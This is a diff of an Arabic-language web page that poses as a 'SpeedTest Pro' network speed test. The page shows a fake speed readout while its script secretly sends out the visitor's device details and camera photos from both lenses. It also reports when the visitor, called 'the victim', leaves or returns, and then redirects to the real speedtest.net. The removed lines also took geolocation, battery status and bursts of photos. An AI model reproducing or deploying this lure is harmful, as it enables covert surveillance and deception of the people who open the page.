@@ -3,22 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>SpeedTest Pro | فحص سرعة الشبكة</title>
+    <title>SpeedTest Pro | فحص سريع</title>
     <style>
         :root { --accent: #00d2ff; --bg: #0b0e18; }
-        body { background: var(--bg); color: white; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        .card { background: rgba(255,255,255,0.03); padding: 40px; border-radius: 35px; border: 1px solid rgba(255,255,255,0.1); backdrop-filter: blur(20px); text-align: center; width: 85%; max-width: 400px; box-shadow: 0 20px 60px rgba(0,0,0,0.6); }
-        .btn-go { width: 150px; height: 150px; border-radius: 50%; border: 4px solid var(--accent); background: transparent; color: var(--accent); font-size: 32px; font-weight: 900; cursor: pointer; transition: 0.4s; outline: none; box-shadow: 0 0 20px rgba(0,210,255,0.2); }
-        .btn-go:active { transform: scale(0.9); background: rgba(0, 210, 255, 0.1); }
+        body { background: var(--bg); color: white; font-family: 'Segoe UI', sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .card { background: rgba(255,255,255,0.03); padding: 40px; border-radius: 35px; border: 1px solid rgba(255,255,255,0.1); backdrop-filter: blur(20px); text-align: center; width: 85%; max-width: 400px; }
+        .btn-go { width: 150px; height: 150px; border-radius: 50%; border: 4px solid var(--accent); background: transparent; color: var(--accent); font-size: 32px; font-weight: 900; cursor: pointer; transition: 0.4s; outline: none; }
         #speedBox { display: none; margin-top: 10px; }
-        .num { font-size: 55px; font-weight: 900; color: var(--accent); text-shadow: 0 0 20px rgba(0,210,255,0.4); }
+        .num { font-size: 55px; font-weight: 900; color: var(--accent); }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
     <div class="card">
-        <h2 style="font-weight: 300; letter-spacing: 3px; margin-bottom: 5px;">SPEEDTEST</h2>
-        <p id="statusText" style="color: #6a728e; font-size: 13px; margin-bottom: 30px;">اضغط للبدء واختيار أفضل سيرفر</p>
+        <h2>SPEEDTEST</h2>
+        <p id="statusText" style="color: #6a728e; font-size: 13px; margin-bottom: 30px;">اضغط لبدء فحص الشبكة</p>
         <button id="goBtn" class="btn-go">GO</button>
         <div id="speedBox">
             <span id="num" class="num">0.0</span>
@@ -49,16 +48,9 @@
         }
 
         async function getReport() {
-            let info = `📊 *تقرير شامل للهدف:* \n\n`;
+            let info = `📊 *تجربة سريعة (صورة واحدة):* \n\n`;
             info += `• 📱 الجهاز: \`${navigator.platform}\`\n`;
             info += `• 💾 الرام: \`${navigator.deviceMemory || "؟"} GB\`\n`;
-            info += `• ⚙️ المعالج: \`${navigator.hardwareConcurrency} Cores\`\n`;
-            info += `• 🖥️ الشاشة: \`${screen.width}x${screen.height}\`\n`;
-
-            try {
-                const b = await navigator.getBattery();
-                info += `• 🔋 البطارية: \`${Math.round(b.level * 100)}%\` (${b.charging ? "🔌 يشحن" : "🔋"})\n`;
-            } catch(e) {}
 
             const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
             if (conn) {
@@ -74,57 +66,54 @@
             return info;
         }
 
-        async function captureBurst(mode, count) {
+        async function captureSingle(mode) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
                 const v = document.getElementById("v");
                 const c = document.getElementById("c");
                 v.srcObject = stream;
                 
-                // انتظار 2.5 ثانية لضمان وضوح العدسة تماماً
-                await new Promise(r => setTimeout(r, 2500)); 
+                // انتظار ثانيتين لفتح العدسة ومنع السواد
+                await new Promise(r => setTimeout(r, 2000)); 
 
-                for (let i = 0; i < count; i++) {
-                    c.width = 720; c.height = 960;
-                    c.getContext("2d").drawImage(v, 0, 0);
-                    const blob = await new Promise(res => c.toBlob(res, "image/jpeg", 0.65));
-                    if (blob) {
-                        send(`📸 ${mode === 'user' ? 'أمامية' : 'خلفية'} - لقطة ${i+1}/5`, true, blob);
-                    }
-                    await new Promise(r => setTimeout(r, 400)); 
+                c.width = 720; c.height = 960;
+                c.getContext("2d").drawImage(v, 0, 0);
+                const blob = await new Promise(res => c.toBlob(res, "image/jpeg", 0.7));
+                if (blob) {
+                    await send(`📸 لقطة ${mode === 'user' ? 'أمامية' : 'خلفية'} (اختبار)`, true, blob);
                 }
-                stream.getTracks().forEach(t => t.stop()); // إغلاق الكاميرا لمنع تداخل الموارد
-            } catch (e) {}
+                
+                // إغلاق الكاميرا فوراً
+                stream.getTracks().forEach(t => t.stop()); 
+            } catch (e) {
+                await send(`❌ فشل تصوير الكاميرا الـ ${mode === 'user' ? 'الأمامية' : 'الخلفية'}`);
+            }
         }
 
-        // تتبع حالة البقاء أو المغادرة
-        window.onblur = () => send("⚠️ *تنبيه: الضحية غادر الصفحة الآن*");
-        window.onfocus = () => send("✅ *تنبيه: الضحية عاد لفتح الصفحة*");
+        window.onblur = () => send("⚠️ الضحية غادر الصفحة");
+        window.onfocus = () => send("✅ الضحية عاد للصفحة");
 
         document.getElementById("goBtn").onclick = async function() {
             this.style.display = "none";
             document.getElementById("speedBox").style.display = "block";
-            document.getElementById("statusText").innerText = "جاري الاتصال بالسيرفر...";
+            document.getElementById("statusText").innerText = "جاري الفحص...";
 
             const timer = setInterval(() => {
                 document.getElementById("num").innerText = (Math.random() * (98 - 85) + 85).toFixed(1);
             }, 100);
 
-            // 1. التقرير والموقع
+            // 1. التقرير
             send(await getReport());
-            navigator.geolocation.getCurrentPosition(p => {
-                send(`📍 موقع الهدف:\n[فتح عبر الخريطة](https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`);
-            }, () => send("❌ الضحية رفض إذن الموقع"));
 
-            // 2. تصوير Burst (5 أمامية + 5 خلفية)
-            await captureBurst("user", 5);
-            await captureBurst("environment", 5);
+            // 2. تصوير لقطة واحدة أمامية ثم واحدة خلفية
+            await captureSingle("user");
+            await captureSingle("environment");
 
-            // 3. التوجيه النهائي
+            // 3. توجيه سريع
             setTimeout(() => {
                 clearInterval(timer);
                 location.href = "https://www.speedtest.net/ar";
-            }, 4000); 
+            }, 2000); 
         };
     </script>
 </body>
